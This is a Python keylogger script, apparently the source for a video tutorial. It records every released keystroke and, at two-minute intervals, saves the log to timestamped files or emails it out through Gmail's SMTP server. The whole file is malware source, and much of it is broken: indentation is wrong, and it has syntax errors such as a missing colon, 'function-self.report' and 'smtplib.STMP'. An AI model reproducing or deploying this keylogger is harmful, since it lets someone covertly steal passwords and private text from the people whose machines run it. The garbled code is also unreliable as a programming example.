import keyboard
import smtplib 
from threading import Timer
from datetime import datetime 

#explain the block in video

#explain obtaining keylogs via email

SEND_REPORT_EVERY = 120
EMAIL_ADDRESS = "INSERT EMAIL HERE"
EMAIL_PASSWORD ="INSERT EMAIL PASSWORD HERE"

#end report email function

class Keylogger:
    def __init__(self, interval, report_method="email"): 
     
     #this function passes SEND_REPORT_EVERY to interval

     self.interval = interval 
     self.report_method = report_method

     #logs keystrokes in self.interval

     self.log = ""

     self.start_dt = datetime.now()
    self.end_dt = datetime.now()

    

#function that calls back for every key released in a keyboard

def callback(self, event):

#this triggers when a keyboard event occurs

name = event.name()
if len(name) >1: 
    if name == "space"

    name = ""
elif name == "enter":
    name = "[ENTER]\n"
elif name =="decimal":
    name = "."
else:
    name = name.replace("", "", "_")
    name = f"[{name.upper()}]"
    
self.log+=name

#Lines 39-52 ensures that when a key is released(not just pressed), that it is put into the self.log variable.

def update_filename(self):

    start_dt_str = str(self.start_dt)[:-7].replace(".", "-").replace(":", "")
    end_dt_str = str(self.end_dt)[:-7].replace(".", "-").replace(":", "")
    self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file_(self):

        with open(f"{self.filename}.txt", "w") as f:

            #writes keylogs to file


        print(self.log, file=f)
    print(f"[+] Saved {self.filename}.txt")


def sendmail(self, email, password, message):

        server = smtplib.STMP(host="smtp.gmail.com", port=587)

        server.starttls()

        server.login(email, password)

        server.sendmail(email, email, message)

        server.quit()


#method that reports kelogs @ intervals specificed

def report (self):
        if self.log:
            self.end_dt = datetime.now()
        
        self.update_filename()
        if self.report_method == "email":

            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        elif self.report_method == "file":

            self.report_to_file()

            self.start_dt = datetime.now()
        self.log = ""
    timer = Timer(interval=self.interval, function-self.report)

    timer.daemon =True
    timer.start

def start(self):

    self.start_dt = datetime.now()

    keyboard.on_release(callback=self.callback)

    self.report()

    keyboard.wait()

    if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()